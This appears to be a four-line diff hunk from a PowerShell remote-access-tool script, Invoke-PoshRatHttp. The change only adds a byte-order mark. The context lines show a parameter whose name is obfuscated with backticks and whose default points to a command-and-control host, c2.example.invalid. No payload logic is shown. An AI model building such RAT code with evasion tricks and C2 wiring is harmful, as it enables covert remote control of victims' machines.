@@ -1,4 +1,4 @@
-function Invoke-PoshRatHttp {
+﻿function Invoke-PoshRatHttp {
     [CmdletBinding()]
     param(
         [string]${sE`RV`ER} = "https://c2.example.invalid",
